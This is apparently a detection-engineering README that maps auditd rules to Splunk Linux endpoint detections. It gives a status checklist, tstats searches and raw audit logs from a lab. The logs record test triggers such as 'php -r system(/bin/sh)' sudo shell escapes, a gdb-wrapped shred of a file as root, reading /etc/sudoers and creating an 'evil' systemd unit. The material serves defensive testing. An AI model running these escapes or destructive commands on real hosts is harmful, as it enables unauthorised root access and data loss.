

# auditd_sec_content_mapping
mapping auditd configuration to security content endpoint detections

## Quickstart:

### 1. auditd config

1. Save audit.rules file in the configuration location (e.g. /etc/audit/rules.d/audit.rules)
2. Reload the rules
```
auditctl -R /etc/audit/rules.d/audit.rules
service auditd reload
```
3. Validate rules: 
```
auditctl -l
```

### 2. Splunk add-ons

Install the following Splunk Add-ons:

https://splunkbase.splunk.com/app/833\ 

https://splunkbase.splunk.com/app/3412 

https://splunkbase.splunk.com/app/4232

### 3. Additional Splunk config

1. props.conf
2. eventtypes.conf
3. tags.conf


## Full list of detections (31 Jan 2023)

Source: https://github.com/splunk/security_content/tree/develop/detections/endpoint

| Search | done |
| --- | --- |
| [Linux Possible Ssh Key File Creation](#linux-possible-ssh-key-file-creation) | d |
| [Linux Possible Access Or Modification Of sshd Config File](#Linux-Possible-Access-Or-Modification-of-sshd-config-file) | d | 
| [Linux File Created In Kernel Driver Directory](#Linux-File-created-In-Kernel-Driver-Directory) | d |
| [Linux NOPASSWD Entry In Sudoers File](#Linux-NOPASSWD-Entry-In-Sudoers-File) | d |
| [Linux c89 Privilege Escalation](#Linux-c89-Privilege-Escalation) | d |
| [Linux Doas Tool Execution](#Linux-Doas-Tool-Execution) | Not available in Centos |
| [Linux AWK Privilege Escalation](#Linux-AWK-Privilege-Escalation) | d |
| [Linux Ruby Privilege Escalation](#Linux-Ruby-Privilege-Escalation) | d |
| [Linux pkexec Privilege Escalation](#Linux-pkexec-Privilege-Escalation) | d |
| [Linux Deleting Critical Directory Using RM Command](#Linux-Deleting-Critical-Directory-Using-RM-Command) | d |
| [Linux Find Privilege Escalation](#Linux-Find-Privilege-Escalation) | d |
| [Linux Add Files In Known Crontab Directories](#Linux-Add-Files-In-Known-Crontab-Directories) | d |
| [Linux Deletion of SSL Certificate](#Linux-Deletion-of-SSL-Certificate) | d |
| [Linux System Network Discovery](#Linux-System-Network-Discovery) | d |
| [Linux Obfuscated Files or Information Base64 Decode](#Linux-Obfuscated-Files-or-Information-Base64-Decode) | d |
| [Linux Deletion Of Cron Jobs](#Linux-Deletion-Of-Cron-Jobs) | d |
| [Linux Disable Services](#Linux-Disable-Services) | d |
| [Linux Install Kernel Module Using Modprobe Utility](#Linux-Install-Kernel-Module-Using-Modprobe-Utility) | d |
| [Linux File Creation In Profile Directory](#Linux-File-Creation-In-Profile-Directory) | d |
| [Linux Sudoers Tmp File Creation](#Linux-Sudoers-Tmp-File-Creation) | d |
| [Linux Possible Append Command To At Allow Config File](#Linux-Possible-Append-Command-To-At-Allow-Config-File) | not work echo |
| [Linux Busybox Privilege Escalation](#Linux-Busybox-Privilege-Escalation) | d |
| [Linux Preload Hijack Library Calls](#Linux-Preload-Hijack-Library-Calls) | d |
| [Linux RPM Privilege Escalation](#Linux-RPM-Privilege-Escalation) | d |
| [Linux Puppet Privilege Escalation](#Linux-Puppet-Privilege-Escalation) | can't install |
| [Linux SSH Authorized Keys Modification](#Linux-SSH-Authorized-Keys-Modification) | d |
| [Linux Clipboard Data Copy](#Linux-Clipboard-Data-Copy) | d |
| [Linux Deletion Of Init Daemon Script](#Linux-Deletion-Of-Init-Daemon-Script) | d |
| [Linux Gem Privilege Escalation](#Linux-Gem-Privilege-Escalation) | d |
| [Linux Ingress Tool Transfer with Curl](#Linux-Ingress-Tool-Transfer-with-Curl) | d |
| [Linux High Frequency Of File Deletion In Boot Folder](#Linux-High-Frequency-Of-File-Deletion-In-Boot-Folder) | d |
| [Linux Common Process For Elevation Control](#Linux-Common-Process-For-Elevation-Control) | d |
| [Linux GNU Awk Privilege Escalation](#Linux-GNU-Awk-Privilege-Escalation) | d |
| [Linux Possible Access To Credential Files](#Linux-Possible-Access-To-Credential-Files) | d |
| [Linux c99 Privilege Escalation](#Linux-c99-Privilege-Escalation) | d |
| [Linux Curl Upload File](#Linux-Curl-Upload-File) | d | 
| [Linux Java Spawning Shell](#Linux-Deletion-Of-Services) | Not possible |
| [Linux Deletion Of Services](#Linux-Deletion-Of-Services) | d |
| [Linux Iptables Firewall Modification](#Linux-Iptables-Firewall-Modification) | d |
| [Linux File Creation In Init Boot Directory](#Linux-File-Creation-In-Init-Boot-Directory) | d |
| [Linux Account Manipulation Of SSH Config and Keys](#Linux-Account-Manipulation-Of-SSH-Config-and-Keys) | d |
| [Linux At Application Execution](#Linux-At-Application-Execution) | d |
| [Linux Docker Privilege Escalation](#Linux-Docker-Privilege-Escalation) | d |
| [Linux Service Started Or Enabled](#Linux-Service-Started-Or-Enabled) |  |
| [Linux Insert Kernel Module Using Insmod Utility](#Linux-Insert-Kernel-Module-Using-Insmod-Utility) | d |
| [Linux Edit Cron Table Parameter](#Linux-Edit-Cron-Table-Parameter) | d |
| [Linux Possible Cronjob Modification With Editor](#Linux-Possible-Cronjob-Modification-With-Editor) | d |
| [Linux Setuid Using Chmod Utility](#Linux-Setuid-Using-Chmod-Utility) | d |
| [Linux Possible Append Command To Profile Config File](#Linux-Possible-Append-Command-To-Profile-Config-File) | d |
| [Linux Decode Base64 to Shell](#Linux-Decode-Base64-to-Shell) | d |
| [Linux MySQL Privilege Escalation](#Linux-MySQL-Privilege-Escalation) | d |
| [Linux Emacs Privilege Escalation](#Linux-Emacs-Privilege-Escalation) | d |
| [Linux DD File Overwrite](#Linux-DD-File-Overwrite) | d |
| [Linux Kworker Process In Writable Process Path](#Linux-Kworker-Process-In-Writable-Process-Path) | d |
| [Linux Ingress Tool Transfer Hunting](#Linux-Ingress-Tool-Transfer-Hunting) | d |
| [Linux Adding Crontab Using List Parameter](#Linux-Adding-Crontab-Using-List-Parameter) | d |
| [Linux Proxy Socks Curl](#Linux-Proxy-Socks-Curl) | d |
| [Linux Change File Owner To Root](#Linux-Change-File-Owner-To-Root) | d |
| [Linux Doas Conf File Creation](#Linux-Doas-Conf-File-Creation) | d |
| [Linux Ngrok Reverse Proxy Usage](#Linux-Ngrok-Reverse-Proxy-Usage) | d |
| [Linux Composer Privilege Escalation](#Linux-Composer-Privilege-Escalation) | d |
| [Linux OpenVPN Privilege Escalation](#Linux-OpenVPN-Privilege-Escalation) | d |
| [Linux Csvtool Privilege Escalation](#Linux-Csvtool-Privilege-Escalation) | d |
| [Linux At Allow Config File Creation](#Linux-At-Allow-Config-File-Creation) | d |
| [Linux Sqlite3 Privilege Escalation](#Linux-Sqlite3-Privilege-Escalation) | d |
| [Linux Persistence and Privilege Escalation Risk Behavior](#Linux-Persistence-and-Privilege-Escalation-Risk-Behavior) | aggregate rule |
| [Linux SSH Remote Services Script Execute](#Linux-SSH-Remote-Services-Script-Execute) | d |
| [Linux Make Privilege Escalation](#Linux-Make-Privilege-Escalation) | d |
| [Linux Node Privilege Escalation](#Linux-Node-Privilege-Escalation) | d |
| [Linux Setuid Using Setcap Utility](#Linux-Setuid-Using-Setcap-Utility) | d |
| [Linux Sudo OR Su Execution](#Linux-Sudo-OR-Su-Execution) | d |
| [Linux Stop Services](#Linux-Stop-Services) | d |
| [Linux Service Restarted](#Linux-Service-Restarted) | d |
| [Linux Shred Overwrite Command](#Linux-Shred-Overwrite-Command) | d |
| [Linux Kernel Module Enumeration](#Linux-Kernel-Module-Enumeration) | d |
| [Linux GDB Privilege Escalation](#Linux-GDB-Privilege-Escalation) | d |
| [Linux APT Privilege Escalation](#Linux-APT-Privilege-Escalation) | d |
| [Linux Cpulimit Privilege Escalation](#Linux-Cpulimit-Privilege-Escalation) | d |
| [Linux apt-get Privilege Escalation](#Linux-apt-get-Privilege-Escalation) | d |
| [Linux High Frequency Of File Deletion In Etc Folder](#Linux-High-Frequency-Of-File-Deletion-In-Etc-Folder) | d |
| [Linux Octave Privilege Escalation](#Linux-Octave-Privilege-Escalation) | could not install centos7 |
| [Linux Add User Account](#Linux-Add-User-Account) | d |
| [Linux Possible Append Cronjob Entry on Existing Cronjob File](#Linux-Possible-Append-Cronjob-Entry-on-Existing-Cronjob-File) | shell built-in |
| [Linux Possible Access To Sudoers File](#Linux-Possible-Access-To-Sudoers-File) | d |
| [Linux PHP Privilege Escalation](#Linux-PHP-Privilege-Escalation) | d | d |
| [Linux Service File Created In Systemd Directory](#Linux-Service-File-Created-In-Systemd-Directory) | d |
| [Linux Visudo Utility Execution](#Linux-Visudo-Utility-Execution) | d |

### TEMPLATE

Datamodel: 
Auditd config:   
CIM Mapping: 
Search:  
Limitations:   
Sample events:    

```

```  

START:

### Linux Visudo Utility Execution

Datamodel: 
Auditd config:   
CIM Mapping: 
Search:  
Limitations:   
Sample events:    

```
type=SYSCALL msg=audit(03/29/2023 19:22:22.028:10416) : arch=x86_64 syscall=open success=no exit=EACCES(Permission denied) a0=0x5599575a8c40 a1=O_RDWR|O_CREAT a2=0440 a3=0x2 items=2 ppid=6257 pid=13305 auid=test-2 uid=test-2 gid=test-2 euid=test-2 suid=test-2 fsuid=test-2 egid=test-2 sgid=test-2 fsgid=test-2 tty=pts1 ses=339 comm=visudo exe=/usr/sbin/visudo subj=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023 key=actions 
type=PROCTITLE msg=audit(03/29/2023 19:22:22.028:10416) : proctitle=visudo 
type=SYSCALL msg=audit(03/29/2023 19:22:22.025:10415) : arch=x86_64 syscall=execve success=yes exit=0 a0=0x2665ff0 a1=0x2666030 a2=0x2654ee0 a3=0x7ffc3ede28a0 items=2 ppid=6257 pid=13305 auid=test-2 uid=test-2 gid=test-2 euid=test-2 suid=test-2 fsuid=test-2 egid=test-2 sgid=test-2 fsgid=test-2 tty=pts1 ses=339 comm=visudo exe=/usr/sbin/visudo subj=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023 key=visudo 
type=EXECVE msg=audit(03/29/2023 19:22:22.025:10415) : argc=1 a0=visudo 
type=PATH msg=audit(03/29/2023 19:22:22.025:10415) : item=0 name=/usr/sbin/visudo inode=474263 dev=fd:00 mode=file,755 ouid=root ogid=root rdev=00:00 obj=system_u:object_r:bin_t:s0 objtype=NORMAL cap_fp=none cap_fi=none cap_fe=0 cap_fver=0 
type=PROCTITLE msg=audit(03/29/2023 19:22:22.025:10415) : proctitle=visudo 
type=CONFIG_CHANGE msg=audit(03/29/2023 19:12:17.830:10096) : auid=unset ses=unset subj=system_u:system_r:unconfined_service_t:s0 op=add_rule key=visudo list=exit res=yes 
type=CONFIG_CHANGE msg=audit(03/29/2023 19:12:17.830:9987) : auid=unset ses=unset subj=system_u:system_r:unconfined_service_t:s0 op=remove_rule key=visudo list=exit res=yes 
type=CONFIG_CHANGE msg=audit(03/29/2023 19:12:12.682:9866) : auid=root ses=318 subj=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023 op=add_rule key=visudo list=exit res=yes 
type=CONFIG_CHANGE msg=audit(03/29/2023 19:12:12.668:9758) : auid=root ses=318 subj=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023 op=remove_rule key=visudo list=exit res=yes 
```

### Linux Service File Created In Systemd Directory

Datamodel: 
Auditd config:   
CIM Mapping: 
Search:  
Limitations:   
Sample events:    

```
type=PATH msg=audit(03/29/2023 19:12:25.815:10201) : item=0 name=/etc/systemd/system/hello_evil.service inode=34534443 dev=fd:00 mode=file,644 ouid=root ogid=root rdev=00:00 obj=unconfined_u:object_r:systemd_unit_file_t:s0 objtype=NORMAL cap_fp=none cap_fi=none cap_fe=0 cap_fver=0 
``` 


### Linux PHP Privilege Escalation

Datamodel: 
Auditd config:   
CIM Mapping: 
Search:  
```
| tstats `security_content_summariesonly` count min(_time) as firstTime max(_time)
  as lastTime from datamodel=Endpoint.Processes where Processes.process="*php*-r*" AND Processes.process="*system*" by Processes.dest Processes.user Processes.parent_process_name
  Processes.process_name Processes.process Processes.process_id Processes.parent_process_id
  Processes.process_guid | `drop_dm_object_name(Processes)` | `security_content_ctime(firstTime)`
  | `security_content_ctime(lastTime)` | `linux_php_privilege_escalation_filter`
```
Limitations:   
Command triggering events:
```
sudo php -r 'system(getenv("CMD"));'
```
Sample events:    

```
type=SYSCALL msg=audit(03/29/2023 19:04:16.232:8832) : arch=x86_64 syscall=execve success=yes exit=0 a0=0x564bbacf0248 a1=0x564bbad02198 a2=0x564bbad16e90 a3=0x0 items=2 ppid=11923 pid=11927 auid=test-2 uid=root gid=root euid=root suid=root fsuid=root egid=root sgid=root fsgid=root tty=pts1 ses=339 comm=php exe=/usr/bin/php subj=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023 key=php_priv_escalation 
type=EXECVE msg=audit(03/29/2023 19:04:16.232:8832) : argc=3 a0=php a1=-r a2=system(/bin/sh) 
type=PATH msg=audit(03/29/2023 19:04:16.232:8832) : item=0 name=/bin/php inode=101567087 dev=fd:00 mode=file,755 ouid=root ogid=root rdev=00:00 obj=system_u:object_r:bin_t:s0 objtype=NORMAL cap_fp=none cap_fi=none cap_fe=0 cap_fver=0 
type=PROCTITLE msg=audit(03/29/2023 19:04:16.232:8832) : proctitle=php -r system(/bin/sh) 
type=USER_CMD msg=audit(03/29/2023 19:04:16.170:8829) : pid=11923 uid=test-2 auid=test-2 ses=339 subj=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023 msg='cwd=/home/test-2 cmd=php -r system(/bin/sh) terminal=pts/1 res=success' 
type=CONFIG_CHANGE msg=audit(03/29/2023 19:03:56.521:8807) : auid=unset ses=unset subj=system_u:system_r:unconfined_service_t:s0 op=add_rule key=php_priv_escalation list=exit res=yes 
type=CONFIG_CHANGE msg=audit(03/29/2023 19:03:56.521:8699) : auid=unset ses=unset subj=system_u:system_r:unconfined_service_t:s0 op=remove_rule key=php_priv_escalation list=exit res=yes 
type=CONFIG_CHANGE msg=audit(03/29/2023 19:03:45.167:8579) : auid=root ses=318 subj=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023 op=add_rule key=php_priv_escalation list=exit res=yes 
```  


### Linux Possible Access To Sudoers File

Datamodel: 
Auditd config:   
CIM Mapping: 
Search:  
Limitations:   
Sample events:    

```
type=USER_CMD msg=audit(03/29/2023 18:52:00.517:8080) : pid=11003 uid=test-2 auid=test-2 ses=339 subj=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023 msg='cwd=/home/test-2 cmd=cat /etc/sudoers terminal=pts/1 res=success' 

```  


### Linux Possible Append Cronjob Entry on Existing Cronjob File

Datamodel: 
Auditd config:   
CIM Mapping: 
Search:  
Limitations: will not work as the search is looking for process containing "echo" and "/etc/at.allow". "echo" is a shell built-in command    
Sample events:    

```

```  




### Linux Add User Account

Datamodel: 
Auditd config:   
CIM Mapping: 
Search:  
Limitations:   
Sample events:    

```
type=USER_MGMT msg=audit(03/29/2023 18:47:41.221:7988) : pid=10725 uid=root auid=test-2 ses=339 subj=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023 msg='op=add-home-dir id=peter1 exe=/usr/sbin/useradd hostname=localhost.localdomain addr=? terminal=pts/1 res=success' 
type=SYSCALL msg=audit(03/29/2023 18:47:41.221:7987) : arch=x86_64 syscall=chmod success=yes exit=0 a0=0x55d3ad926540 a1=0700 a2=0x0 a3=0x3f items=1 ppid=10720 pid=10725 auid=test-2 uid=root gid=root euid=root suid=root fsuid=root egid=root sgid=root fsgid=root tty=pts1 ses=339 comm=useradd exe=/usr/sbin/useradd subj=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023 key=perm_mod 
type=PROCTITLE msg=audit(03/29/2023 18:47:41.221:7987) : proctitle=useradd peter1 
type=SYSCALL msg=audit(03/29/2023 18:47:41.178:7985) : arch=x86_64 syscall=unlink success=yes exit=0 a0=0x7ffc75e55ae0 a1=0x7ffffff4 a2=0x7ffc75e55af0 a3=0x65726373662f7274 items=2 ppid=10720 pid=10725 auid=test-2 uid=root gid=root euid=root suid=root fsuid=root egid=root sgid=root fsgid=root tty=pts1 ses=339 comm=useradd exe=/usr/sbin/useradd subj=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023 key=delete 
type=PROCTITLE msg=audit(03/29/2023 18:47:41.178:7985) : proctitle=useradd peter1 
type=SYSCALL msg=audit(03/29/2023 18:47:41.178:7984) : arch=x86_64 syscall=unlink success=yes exit=0 a0=0x7ffc75e55ae0 a1=0x7ffffff4 a2=0x7ffc75e55af0 a3=0x65726373662f7274 items=2 ppid=10720 pid=10725 auid=test-2 uid=root gid=root euid=root suid=root fsuid=root egid=root sgid=root fsgid=root tty=pts1 ses=339 comm=useradd exe=/usr/sbin/useradd subj=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023 key=delete 
type=PROCTITLE msg=audit(03/29/2023 18:47:41.178:7984) : proctitle=useradd peter1 
type=SYSCALL msg=audit(03/29/2023 18:47:41.178:7983) : arch=x86_64 syscall=unlink success=yes exit=0 a0=0x7ffc75e55ae0 a1=0x7ffffff3 a2=0x7ffc75e55af1 a3=0x65726373662f7274 items=2 ppid=10720 pid=10725 auid=test-2 uid=root gid=root euid=root suid=root fsuid=root egid=root sgid=root fsgid=root tty=pts1 ses=339 comm=useradd exe=/usr/sbin/useradd subj=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023 key=delete 
type=PROCTITLE msg=audit(03/29/2023 18:47:41.178:7983) : proctitle=useradd peter1 
type=SYSCALL msg=audit(03/29/2023 18:47:41.178:7982) : arch=x86_64 syscall=unlink success=yes exit=0 a0=0x7ffc75e55ae0 a1=0x7ffffff5 a2=0x7ffc75e55aef a3=0x65726373662f7274 items=2 ppid=10720 pid=10725 auid=test-2 uid=root gid=root euid=root suid=root fsuid=root egid=root sgid=root fsgid=root tty=pts1 ses=339 comm=useradd exe=/usr/sbin/useradd subj=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023 key=delete 
type=PROCTITLE msg=audit(03/29/2023 18:47:41.178:7982) : proctitle=useradd peter1 
type=SYSCALL msg=audit(03/29/2023 18:47:41.178:7981) : arch=x86_64 syscall=unlink success=yes exit=0 a0=0x7ffc75e55ae0 a1=0x7ffffff4 a2=0x7ffc75e55af0 a3=0x65726373662f7274 items=2 ppid=10720 pid=10725 auid=test-2 uid=root gid=root euid=root suid=root fsuid=root egid=root sgid=root fsgid=root tty=pts1 ses=339 comm=useradd exe=/usr/sbin/useradd subj=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023 key=delete 
type=PROCTITLE msg=audit(03/29/2023 18:47:41.178:7981) : proctitle=useradd peter1 
type=SYSCALL msg=audit(03/29/2023 18:47:41.178:7980) : arch=x86_64 syscall=unlink success=yes exit=0 a0=0x7ffc75e55ae0 a1=0x7ffffff4 a2=0x7ffc75e55af0 a3=0x65726373662f7274 items=2 ppid=10720 pid=10725 auid=test-2 uid=root gid=root euid=root suid=root fsuid=root egid=root sgid=root fsgid=root tty=pts1 ses=339 comm=useradd exe=/usr/sbin/useradd subj=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023 key=delete 
type=PROCTITLE msg=audit(03/29/2023 18:47:41.178:7980) : proctitle=useradd peter1 
type=SYSCALL msg=audit(03/29/2023 18:47:41.178:7979) : arch=x86_64 syscall=rename success=yes exit=0 a0=0x7ffc75e55ac0 a1=0x55d3acef8240 a2=0x7ffc75e55a30 a3=0x55d3accf21e8 items=5 ppid=10720 pid=10725 auid=test-2 uid=root gid=root euid=root suid=root fsuid=root egid=root sgid=root fsgid=root tty=pts1 ses=339 comm=useradd exe=/usr/sbin/useradd subj=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023 key=delete 
type=PROCTITLE msg=audit(03/29/2023 18:47:41.178:7979) : proctitle=useradd peter1 
type=SYSCALL msg=audit(03/29/2023 18:47:41.175:7978) : arch=x86_64 syscall=fchmod success=yes exit=0 a0=0x5 a1=0644 a2=0x0 a3=0x1 items=1 ppid=10720 pid=10725 auid=test-2 uid=root gid=root euid=root suid=root fsuid=root egid=root sgid=root fsgid=root tty=pts1 ses=339 comm=useradd exe=/usr/sbin/useradd subj=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023 key=etc_files 
type=PROCTITLE msg=audit(03/29/2023 18:47:41.175:7978) : proctitle=useradd peter1 
type=SYSCALL msg=audit(03/29/2023 18:47:41.175:7977) : arch=x86_64 syscall=fchown success=yes exit=0 a0=0x5 a1=0x0 a2=0x0 a3=0x1 items=1 ppid=10720 pid=10725 auid=test-2 uid=root gid=root euid=root suid=root fsuid=root egid=root sgid=root fsgid=root tty=pts1 ses=339 comm=useradd exe=/usr/sbin/useradd subj=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023 key=etc_files 
```  


### Linux Octave Privilege Escalation

Datamodel: 
Auditd config:   
CIM Mapping: 
Search:  
Limitations: could not install in centos 7    
Sample events:    

```

```  


### Linux High Frequency Of File Deletion In Etc Folder

Datamodel: 
Auditd config:   
CIM Mapping: 
Search: 
```
| tstats `security_content_summariesonly` values(Filesystem.file_name) as deletedFileNames values(Filesystem.user_category) as file_path_location dc(Filesystem.file_path) as numOfDelFilePath count min(_time) as firstTime max(_time) as lastTime 
  FROM datamodel=Endpoint.Filesystem  
  where Filesystem.action=deleted Filesystem.user_category=*etc*
  | where numOfDelFilePath>=5
```
Limitations: This is possible in a different way as described:  
1. Alias the obj field to an unused field in the datamodel e.g. user_category  
2. change the search to the example above
3. This search shows large number of deleted files in boot directory  
Sample events:    
```
type=PATH msg=audit(03/29/2023 18:22:01.620:6794) : item=2 name=(null) inode=34534442 dev=fd:00 mode=dir,755 ouid=root ogid=root rdev=00:00 obj=unconfined_u:object_r:etc_t:s0 objtype=DELETE cap_fp=none cap_fi=none cap_fe=0 cap_fver=0 
type=PATH msg=audit(03/29/2023 18:22:01.620:6793) : item=1 name=file4 inode=34534448 dev=fd:00 mode=file,644 ouid=root ogid=root rdev=00:00 obj=unconfined_u:object_r:etc_t:s0 objtype=DELETE cap_fp=none cap_fi=none cap_fe=0 cap_fver=0 
type=PATH msg=audit(03/29/2023 18:22:01.620:6792) : item=1 name=file3 inode=34534447 dev=fd:00 mode=file,644 ouid=root ogid=root rdev=00:00 obj=unconfined_u:object_r:etc_t:s0 objtype=DELETE cap_fp=none cap_fi=none cap_fe=0 cap_fver=0 
type=PATH msg=audit(03/29/2023 18:22:01.620:6791) : item=1 name=file2 inode=34534446 dev=fd:00 mode=file,644 ouid=root ogid=root rdev=00:00 obj=unconfined_u:object_r:etc_t:s0 objtype=DELETE cap_fp=none cap_fi=none cap_fe=0 cap_fver=0 
type=PATH msg=audit(03/29/2023 18:22:01.620:6790) : item=1 name=file1 inode=34534445 dev=fd:00 mode=file,644 ouid=root ogid=root rdev=00:00 obj=unconfined_u:object_r:etc_t:s0 objtype=DELETE cap_fp=none cap_fi=none cap_fe=0 cap_fver=0 
```



### Linux apt-get Privilege Escalation

Datamodel: 
Auditd config:   
CIM Mapping: 
Search:  
Limitations: apt-get not suitable for Centos    
Sample events:    

```

```  


### Linux Cpulimit Privilege Escalation

Datamodel: 
Auditd config:   
CIM Mapping: 
Search:  
Limitations:   
Sample events:    

```
type=SYSCALL msg=audit(03/29/2023 18:17:28.624:6672) : arch=x86_64 syscall=execve success=yes exit=0 a0=0x562c85a9d248 a1=0x562c85aaf198 a2=0x562c85ac3ea0 a3=0x0 items=2 ppid=8383 pid=8387 auid=test-2 uid=root gid=root euid=root suid=root fsuid=root egid=root sgid=root fsgid=root tty=pts1 ses=339 comm=cpulimit exe=/usr/bin/cpulimit subj=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023 key=cpulimit_priv_escalation 
type=EXECVE msg=audit(03/29/2023 18:17:28.624:6672) : argc=5 a0=cpulimit a1=-l a2=100 a3=-f a4=/bin/ls 
type=PATH msg=audit(03/29/2023 18:17:28.624:6672) : item=0 name=/bin/cpulimit inode=101419744 dev=fd:00 mode=file,755 ouid=root ogid=root rdev=00:00 obj=system_u:object_r:bin_t:s0 objtype=NORMAL cap_fp=none cap_fi=none cap_fe=0 cap_fver=0 
type=PROCTITLE msg=audit(03/29/2023 18:17:28.624:6672) : proctitle=cpulimit -l 100 -f /bin/ls 
type=USER_CMD msg=audit(03/29/2023 18:17:28.604:6669) : pid=8383 uid=test-2 auid=test-2 ses=339 subj=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023 msg='cwd=/home/test-2 cmd=cpulimit -l 100 -f /bin/ls terminal=pts/1 res=success' 
type=CONFIG_CHANGE msg=audit(03/29/2023 18:16:53.956:6656) : auid=unset ses=unset subj=system_u:system_r:unconfined_service_t:s0 op=add_rule key=cpulimit_priv_escalation list=exit res=yes 
type=CONFIG_CHANGE msg=audit(03/29/2023 18:16:53.911:6551) : auid=unset ses=unset subj=system_u:system_r:unconfined_service_t:s0 op=remove_rule key=cpulimit_priv_escalation list=exit res=yes 
type=CONFIG_CHANGE msg=audit(03/29/2023 18:16:48.408:6434) : auid=root ses=318 subj=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023 op=add_rule key=cpulimit_priv_escalation list=exit res=yes 
type=SOFTWARE_UPDATE msg=audit(03/29/2023 18:16:12.021:6201) : pid=8212 uid=root auid=root ses=318 subj=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023 msg='sw=cpulimit-1:0.2-1.20151118gitf4d2682.el6.x86_64 sw_type=rpm key_enforce=0 gpg_res=0 root_dir=/ comm=yum exe=/usr/bin/python2.7 hostname=localhost.localdomain addr=? terminal=pts/0 res=success' 
```  


### Linux APT Privilege Escalation

Datamodel: 
Auditd config:   
CIM Mapping: 
Search:  
Limitations: apt does not work well on Centos, I could not get it to work  
Sample events:    

```

```



### Linux GDB Privilege Escalation

Datamodel: 
Auditd config:   
CIM Mapping: 
Search:  
```
| tstats `security_content_summariesonly` count min(_time) as firstTime max(_time)
  as lastTime from datamodel=Endpoint.Processes where Processes.process="*gdb*" AND Processes.process="*-nx*" AND Processes.process="*-ex*" by Processes.dest Processes.user Processes.parent_process_name
  Processes.process_name Processes.process Processes.process_id Processes.parent_process_id
  Processes.process_guid | `drop_dm_object_name(Processes)` | `security_content_ctime(firstTime)`
  | `security_content_ctime(lastTime)` | `linux_gdb_privilege_escalation_filter`
```
Limitations:   
Sample events:    

```
type=SYSCALL msg=audit(03/29/2023 18:08:08.217:5971) : arch=x86_64 syscall=execve success=yes exit=0 a0=0x55aec5a42248 a1=0x55aec5a54198 a2=0x55aec5a67f80 a3=0x0 items=2 ppid=7621 pid=7623 auid=test-2 uid=root gid=root euid=root suid=root fsuid=root egid=root sgid=root fsgid=root tty=pts1 ses=339 comm=gdb exe=/usr/bin/gdb subj=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023 key=gdb_priv_escalation 
type=EXECVE msg=audit(03/29/2023 18:08:08.217:5971) : argc=11 a0=gdb a1=-nx a2=-ex a3=shred a4=-n a5=1 a6=-x a7=-z a8=/usr/lib/systemd/test_file a9=-ex a10=quit 
type=PATH msg=audit(03/29/2023 18:08:08.217:5971) : item=0 name=/bin/gdb inode=101216555 dev=fd:00 mode=file,755 ouid=root ogid=root rdev=00:00 obj=system_u:object_r:bin_t:s0 objtype=NORMAL cap_fp=none cap_fi=none cap_fe=0 cap_fver=0 
type=PROCTITLE msg=audit(03/29/2023 18:08:08.217:5971) : proctitle=gdb -nx -ex shred -n 1 -x -z /usr/lib/systemd/test_file -ex quit 
type=USER_CMD msg=audit(03/29/2023 18:08:08.170:5968) : pid=7621 uid=test-2 auid=test-2 ses=339 subj=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023 msg='cwd=/home/test-2 cmd=gdb -nx -ex shred -n 1 -x -z /usr/lib/systemd/test_file -ex quit terminal=pts/1 res=success' 
type=SYSCALL msg=audit(03/29/2023 18:07:42.926:5955) : arch=x86_64 syscall=execve success=yes exit=0 a0=0x556dd66de248 a1=0x556dd66f0198 a2=0x556dd6703f80 a3=0x0 items=2 ppid=7612 pid=7614 auid=test-2 uid=root gid=root euid=root suid=root fsuid=root egid=root sgid=root fsgid=root tty=pts1 ses=339 comm=gdb exe=/usr/bin/gdb subj=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023 key=gdb_priv_escalation 
type=EXECVE msg=audit(03/29/2023 18:07:42.926:5955) : argc=11 a0=gdb a1=-nx a2=-ex a3=shred a4=-n a5=1 a6=-x a7=-z a8=/usr/lib/systemd/test_file a9=-ex a10=quit 
type=PATH msg=audit(03/29/2023 18:07:42.926:5955) : item=0 name=/bin/gdb inode=101216555 dev=fd:00 mode=file,755 ouid=root ogid=root rdev=00:00 obj=system_u:object_r:bin_t:s0 objtype=NORMAL cap_fp=none cap_fi=none cap_fe=0 cap_fver=0 
type=PROCTITLE msg=audit(03/29/2023 18:07:42.926:5955) : proctitle=gdb -nx -ex shred -n 1 -x -z /usr/lib/systemd/test_file -ex quit 
type=USER_CMD msg=audit(03/29/2023 18:07:42.913:5952) : pid=7612 uid=test-2 auid=test-2 ses=339 subj=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023 msg='cwd=/home/test-2 cmd=gdb -nx -ex shred -n 1 -x -z /usr/lib/systemd/test_file -ex quit terminal=pts/1 res=success' 
type=SYSCALL msg=audit(03/29/2023 18:05:19.118:5912) : arch=x86_64 syscall=execve success=yes exit=0 a0=0x560155ab2248 a1=0x560155ac4198 a2=0x560155ad7f50 a3=0x0 items=2 ppid=7488 pid=7490 auid=test-2 uid=root gid=root euid=root suid=root fsuid=root egid=root sgid=root fsgid=root tty=pts1 ses=339 comm=gdb exe=/usr/bin/gdb subj=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023 key=gdb_priv_escalation 
type=EXECVE msg=audit(03/29/2023 18:05:19.118:5912) : argc=9 a0=gdb a1=-nx a2=-ex a3=shred a4=-n a5=1 a6=-x a7=-z a8=/usr/lib/systemd/test_file 
